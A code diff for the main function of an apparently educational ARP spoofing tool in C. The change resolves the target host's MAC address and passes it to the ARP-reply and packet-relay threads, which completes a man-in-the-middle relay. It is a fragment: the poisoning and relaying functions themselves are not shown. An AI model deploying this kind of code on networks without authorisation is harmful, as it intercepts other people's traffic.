@@ -47,18 +47,23 @@ int main(int argc, char* argv[]) {
         Ip sender_ip = Ip(argv[i]);
         Ip target_ip = Ip(argv[i + 1]);
         Mac sender_mac;
+        Mac target_mac;
         if (getMacFromIP(dev, &attacker_mac, &attacker_ip, &sender_ip, &sender_mac)) {
             fprintf(stderr, "getMacFromIP error\n");
             return -1;
         }
+        if (getMacFromIP(dev, &attacker_mac, &attacker_ip, &target_ip, &target_mac)) {
+            fprintf(stderr, "getMacFromIP error\n");
+            return -1;
+        }
 
-        SendArpReplyArgs send_arp_reply_args = { &running, dev, &attacker_mac, &attacker_ip, &sender_mac, &sender_ip, &target_ip };
+        SendArpReplyArgs send_arp_reply_args = { &running, dev, &attacker_mac, &attacker_ip, &sender_mac, &sender_ip, &target_mac, &target_ip };
         if (pthread_create(&threads[i], NULL, sendArpReply, (void *)&send_arp_reply_args)) {
             fprintf(stderr, "pthread_create error\n");
             return -1;
         }
 
-        RelayPacketArgs relay_packet_args = { &running, dev, &attacker_mac, &sender_mac };
+        RelayPacketArgs relay_packet_args = { &running, dev, &attacker_mac, &sender_mac, &sender_ip, &target_mac };
         if (pthread_create(&threads[i+1], NULL, relayPacket, (void *)&relay_packet_args)) {
             fprintf(stderr, "pthread_create error\n");
             return -1;
